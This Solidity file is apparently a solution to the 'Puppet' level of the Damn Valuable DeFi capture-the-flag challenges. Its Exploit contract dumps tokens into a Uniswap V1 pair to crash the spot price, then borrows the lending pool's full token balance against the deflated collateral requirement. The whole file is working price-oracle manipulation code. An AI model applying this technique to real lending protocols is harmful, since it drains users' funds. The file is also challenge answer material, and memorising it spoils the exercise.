// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface UniswapV1Exchange {
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract Exploit {
    uint256 PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 10 ** 18;
    uint256 PLAYER_INITIAL_ETH_BALANCE = 25 * 10 ** 18;
    uint256 POOL_INITIAL_TOKEN_BALANCE = 100000 * 10 ** 18;

    UniswapV1Exchange public immutable uniswapPair;
    DamnValuableToken public immutable token;
    PuppetPool public immutable pool;
    address player;

    constructor(address playerAddress, address tokenAddress, address uniswapPairAddress, address poolAddress) payable {
        player = playerAddress;
        token = DamnValuableToken(tokenAddress);
        uniswapPair = UniswapV1Exchange(uniswapPairAddress);
        pool = PuppetPool(poolAddress);
    }

    function exploit() external {
        token.approve(address(uniswapPair), type(uint256).max);
        token.approve(address(pool), type(uint256).max);
        token.approve(address(this), type(uint256).max);
        
        token.transferFrom(player, address(this), PLAYER_INITIAL_TOKEN_BALANCE);

        uint256 ethForSwap = uniswapPair.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE , 1, block.timestamp);
        uint256 ethForBorrow = pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        pool.borrow{value: ethForBorrow}(POOL_INITIAL_TOKEN_BALANCE, address(this));
        uniswapPair.ethToTokenSwapInput{value: ethForSwap}(1, block.timestamp);
        payable(msg.sender).transfer(address(this).balance);
        token.transfer(player, token.balanceOf(address(this)));

    }

    receive() external payable {}
}